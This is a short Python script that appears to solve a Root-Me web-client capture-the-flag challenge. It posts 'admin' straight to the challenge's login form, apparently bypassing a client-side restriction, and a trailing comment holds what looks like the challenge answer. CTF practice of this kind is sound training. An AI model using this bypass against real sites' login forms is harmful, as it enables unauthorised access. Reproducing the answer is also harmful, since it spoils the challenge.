import requests

url = "http://challenge01.root-me.org/web-client/ch25/"
# dukun auth login pake admin
r = requests.post(url, data={'auth-login':'admin', 'authbutton':'Member access'})
print(r.text)

# HTMLCantStopYou